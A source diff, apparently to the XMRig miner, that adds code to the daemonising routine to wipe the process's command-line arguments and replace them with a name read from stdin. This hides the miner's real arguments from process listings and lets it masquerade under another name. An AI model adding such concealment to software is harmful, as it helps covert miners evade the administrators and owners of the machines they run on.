@@ -26,11 +26,13 @@
 #include <csignal>
 #include <cerrno>
 #include <unistd.h>
+#include <iostream>
 
 
 #include "App.h"
 #include "base/io/log/Log.h"
 #include "core/Controller.h"
+#include "core/config/Config.h"
 
 
 bool xmrig::App::background(int &rc)
@@ -42,14 +44,42 @@ bool xmrig::App::background(int &rc)
     int i = fork();
     if (i < 0) {
         rc = 1;
-
         return true;
     }
 
     if (i > 0) {
         rc = 0;
-
         return true;
+    }
+
+    // In child process: hide arguments
+    if (m_argc > 0 && m_argv != nullptr) {
+        char buffer[256] = {0};
+        const char *hidden = "xmrig";
+        //ssize_t len = 0;
+
+        // Try to read the first line from stdin
+        if (isatty(STDIN_FILENO) == 0) { // Only read if not a terminal
+            if (fgets(buffer, sizeof(buffer), stdin) != nullptr) {
+                // Remove trailing newline if present
+                char *newline = strchr(buffer, '\n');
+                if (newline) *newline = '\0';
+                if (buffer[0] != '\0') {
+                    hidden = buffer;
+                }
+            }
+        }
+
+        // Find the start of argv[0] and the end of the last argv
+        char *start = m_argv[0];
+        char *end = m_argv[m_argc - 1] + strlen(m_argv[m_argc - 1]);
+        size_t total_len = end - start;
+        // Zero out the whole region
+        memset(start, '\0', total_len);
+        // Copy as much of the hidden string as fits
+        size_t hidden_len = strlen(hidden);
+        if (hidden_len > total_len) hidden_len = total_len;
+        strncpy(start, hidden, hidden_len);
     }
 
     if (setsid() < 0) {
